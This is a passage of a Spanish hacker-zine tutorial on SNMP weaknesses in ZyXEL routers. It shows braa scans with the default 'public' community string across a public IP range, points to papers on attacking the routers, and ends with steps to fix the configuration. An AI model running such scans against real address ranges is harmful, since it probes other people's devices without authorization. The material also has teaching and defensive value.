+88.22.xyz.205:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.198:100ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.194:100ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.168:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.160:100ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.154:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.153:108ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.150:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.139:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.135:100ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.133:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.109:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.106:100ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.100:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+bt ~ #                                                               
+
+
+ * Ahora todos los P-660HW-D1
+
+bt ~ # braa public@88.22.xyz.100-88.22.xyz.254:161:.1.3.6.1.4.1.890.1.2.6.34
+88.22.xyz.244:100ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.236:88ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.231:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.229:100ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.226:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.205:108ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.198:100ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.194:100ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.168:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.160:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.154:108ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.153:108ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.150:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.139:100ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.135:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.133:108ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.109:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.106:96ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+88.22.xyz.100:104ms:.1.3.6.1.4.1.890.1.2.6.34:Error [2] No such name.
+bt ~ #   
+
+
+ * Adrian Pastor de GNUCITIZEN (www.gnucitizen.org) publico unos "papers"
+   haciendo publicas estas y otras vulnerabilidades de los routers ZyXEL.
+   Entre otras delicias, explica como hacer ataques de inyeccion de scripts
+   usando SNMP, sacar claves DynDNS, usar el router para hacer wardriving,
+   etc, etc.
+
+     -> http://www.packetstormsecurity.org/papers/attack/Hacking_ZyXEL_
+        Gateways.pdf
+     -> http://www.gnucitizen.org/static/blog/2008/04/hacking_zyxel_gateways_
+        part_2.pdf
+
+ * Para los mas avanzados, os recomiendo que investigueis sobre el SNMP walking:
+      
+     -> http://www.cuddletech.com/articles/snmp/node13.html
+
+
+
+[=][=][=][=][=][=][=]
+[  HACKERs BUENOS   ]
+[=][=][=][=][=][=][=]
+
+
+ * Vamos a ver como corregir la vulnerabilidad o disconfiguracion, como lo
+   querais llamar.
+ * En el menu principal via telnet podemos acceder a:
+
+22. SNMP Configuration
+
+  *  Nos aparece esto
+
+
+                          Menu 22 - SNMP Configuration
+
+                  SNMP:
+                    Get Community= public
+                    Set Community= public
+                    Trusted Host= 0.0.0.0
+                    Trap:
+                      Community= public
+                      Destination= 0.0.0.0
+
+
+                    Press ENTER to Confirm or ESC to Cancel:
+
+ * Deberiamos cambiar la password GET y SET por algo menos obvio.
+ * Ademas podemos asignar como Trusted Host a algun PC de la LAN interna
+   para que solo este PC (con la IP que especifiquemos pueda obtener/modificar
+   valores usando SNMP.
+ * Trap: Si configuramos una ip destino, el router enviara a este destino
+   informacion de gestion relativa a interfaces, velocidad, etc. Podemos
+   usar MRTG para recolectar informacion. Por supuesto hay que cambiar la
+   Community!!!
+
+
+
+[=][=][=][=][=][=][=][=]
+[  CONCLUSIoN Y CIERRE ]
+[=][=][=][=][=][=][=][=]
+
+ * El protocolo SNMP es muy versatil para la gestion de las redes. Sobre todo
+   cuando alcanza un area muy extensa. Las impresoras de red lo traen siempre 
+   activado por defecto.
+
+ * El software de MRTG es un ejemplo de potencia de gestion SNMP.
+
+ * No debemos fiarnos nunca de las configuraciones por defecto.
+
+ * Hay que investigar, experimentar y publicar para que el hacking, perdon, el
+   conocimiento siga vivo, gratuito y libre.
+
+
+*EOF*
